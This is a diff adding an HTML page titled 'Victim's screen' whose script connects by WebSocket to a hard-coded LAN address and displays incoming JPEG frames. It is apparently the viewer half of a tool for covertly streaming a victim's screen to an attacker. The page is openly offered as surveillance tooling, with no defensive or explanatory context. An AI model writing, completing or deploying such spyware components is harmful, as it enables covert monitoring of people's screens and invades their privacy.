@@ -1,0 +1,21 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Victim's screen</title>
+  </head>
+  <body>
+    <h1>Watch screen victim!</h1>
+    <img id="screen" />
+    <script>
+      const img = document.getElementById("screen");
+      const socket = new WebSocket("ws://192.168.88.106:2025");
+      socket.binaryType = "arraybuffer";
+      socket.onmessage = (event) => {
+        const blob = new Blob([event.data], { type: "image/jpeg" });
+        img.src = URL.createObjectURL(blob);
+      };
+    </script>
+  </body>
+</html>
